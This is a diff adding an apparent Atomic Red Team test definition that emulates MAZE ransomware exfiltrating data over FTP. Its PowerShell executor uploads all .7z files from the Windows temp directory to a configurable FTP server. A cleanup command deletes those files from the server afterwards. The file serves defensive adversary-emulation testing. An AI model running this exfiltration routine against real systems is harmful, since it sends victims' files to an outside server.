@@ -1,0 +1,40 @@
+{
+    "name": "MAZE FTP Upload",
+    "description": "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP. Upon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server.  Reference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://#{ftp_server}/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')\nif (test-connection -count 1 -computername \"#{ftp_server}\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}\n",
+        "cleanup_command": "$ftp = \"ftp://#{ftp_server}/\"\ntry {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\"))\n{$uri = New-Object System.Uri($ftp+$file.name)\n $ftp_del = [System.Net.FtpWebRequest]::create($uri)\n $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')\n $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile\n $ftp_del.GetResponse()}} catch{}\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1048.003",
+    "tactics": [
+        "Exfiltration"
+    ],
+    "technique": "Exfiltration Over Unencrypted Non-C2 Protocol",
+    "source": "ART",
+    "uuid": "57799bc2-ad1e-4130-a793-fb0c385130ba",
+    "arguments": {
+        "ftp_server": {
+            "description": "FTP Server address",
+            "type": "string",
+            "default": "127.0.0.1"
+        },
+        "username": {
+            "description": "Username for FTP server login",
+            "type": "string",
+            "default": null
+        },
+        "password": {
+            "description": "Password for FTP server login",
+            "type": "string",
+            "default": null
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
